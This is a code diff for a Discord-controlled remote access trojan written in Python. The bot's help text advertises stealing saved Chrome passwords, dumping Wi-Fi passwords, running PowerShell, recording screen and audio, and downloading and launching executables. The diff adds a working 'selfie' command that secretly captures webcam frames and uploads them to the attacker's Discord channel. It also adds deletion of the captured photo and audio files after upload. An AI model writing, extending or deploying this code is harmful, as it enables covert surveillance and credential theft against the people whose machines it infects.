@@ -38,6 +38,9 @@ intents.guilds = True # Enables interaction with discord server
 intents.message_content = True # Allow bot to read messages from discord channel
 bot = commands.Bot(command_prefix='!', intents=intents) # Bot prefix
 
+# current path of executable
+save_path = os.path.dirname(os.path.realpath(__file__))
+
 # Start check vars
 startup_folder_flag_C = False
 startup_folder_flag_A = False
@@ -49,6 +52,7 @@ recording_task = None
 
 # Audio recording vars
 is_audiorecording = False
+
 
 # Functions
 def get_ip_address():
@@ -202,7 +206,7 @@ async def record_screen(ctx, rec: bool):
 
 @bot.command()
 async def what(ctx):
-    commands = "**whoami**-(get current user who is running at this moment)\n**ps**-(execute powershell commands)\n**getwifipass**-(get wifi passwords)\n**steal**-(Steals saved chrome email and passwords)\n**screen** -(start|stop)\n**cam**-(make a photo of any found webcams)\n**getsysinfo**-(get important system info)\n**audio**-(make audio recodings with 10 seconds interfall: !audio start 10 | stop the recording: !audio stop\n**echo**-(make the bot echo you)\n**lauch**-(launch programs like this launch https://website_url.com/update.exe customApplicationName.exe)\n**restart**-(restart bot)\n**stopbot**-(You know what this does)"
+    commands = "**whoami**-(get current user who is running at this moment)\n**ps**-(execute powershell commands)\n**getwifipass**-(get wifi passwords)\n**steal**-(Steals saved chrome email and passwords)\n**screen** -(start|stop)\n**selfie**-(make a photo of any found webcams)\n**getsysinfo**-(get important system info)\n**audio**-(make audio recodings with 10 seconds interfall: !audio start 10 | stop the recording: !audio stop\n**echo**-(make the bot echo you)\n**lauch**-(launch programs like this launch https://website_url.com/update.exe customApplicationName.exe)\n**restart**-(restart bot)\n**stopbot**-(You know what this does)"
     await ctx.send(commands)
 
 @bot.command()
@@ -214,15 +218,23 @@ async def echo(ctx, *, message: str):
     await ctx.send(f" {message}")
 
 @bot.command()
-async def cam(ctx):
+async def selfie(ctx):
     webcams = []
     for camID in range(0,10):
         cam = cv2.VideoCapture(camID)
         if cam.isOpened():
-            webcams.append(cam)
-            print(f"webcam {cam} has been found!")
-            cam.release()
+            ret, frame = cam.read()
+            if ret:
+                file_name = f"selfie.png"
+                file_path = os.path.join(save_path, file_name)
+                cv2.imwrite(file_path, frame)
+                cam.release()
+                await ctx.send(f"📷 {cam} is taking a selfie!")
+                await ctx.channel.send(file=discord.File(file_path, "selfie.png"))
+                os.remove("selfie.png")
+            return None      
         else:
+            await ctx.send(f"📷 {cam} was not found")
             print(f"webcam {cam} was not found")
         
 
@@ -418,6 +430,7 @@ async def audio(ctx, action: str, duration: str = None):
                 audio_data = await record_audio(duration)
                 wav_file = await save_audio_as_wav(audio_data, "msg.wav")
                 await ctx.channel.send(file=discord.File(wav_file, 'msg.wav'))
+                os.remove("msg.wav")
                 await asyncio.sleep(1)
 
         elif action.lower() == "stop":
